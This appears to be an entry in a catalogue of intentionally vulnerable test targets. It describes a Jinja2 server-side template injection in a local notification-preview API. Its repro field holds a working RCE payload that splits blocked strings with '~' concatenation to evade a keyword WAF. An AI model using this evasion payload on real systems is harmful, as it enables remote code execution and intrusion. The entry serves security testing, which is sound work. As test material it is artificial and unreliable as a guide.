  - id: API-SSTI-001
    title: Server-side template injection in notification preview (RCE, behind a keyword WAF)
    class: SSTI
    cwe: CWE-1336
    owasp: "A03:2021"
    tier: 1
    origin: api
    endpoint: "POST /api/notifications/preview"
    severity: Critical
    auth: user
    detector: diver_ssti
    gating: VF_HARDENED
    defense: keyword-waf
    deterministic: true
    secured_twin: API-SSTI-001-SAFE
    intentional: true
    repro: |
      # The preview renders an attacker-controlled Jinja2 template -> RCE, but a
      # keyword WAF blocks the naive dunder payload (403). Bypass it with Jinja2
      # '~' string-concat that splits the blocked substrings (__/globals/popen):
      curl -X POST http://localhost:8081/api/notifications/preview \
        -H "Authorization: Bearer <alice_token>" -H "Content-Type: application/json" \
        -d '{"template":"{{ cycler|attr(\"_\"~\"_init\"~\"_\"~\"_\")|attr(\"_\"~\"_glo\"~\"bals\"~\"_\"~\"_\")|attr(\"_\"~\"_getitem\"~\"_\"~\"_\")(\"os\")|attr(\"po\"~\"pen\")(\"echo VULNFORGE_RCE\")|attr(\"read\")() }}"}'
      # -> 200 with the command output; the naive cycler.__init__.__globals__... is 403.

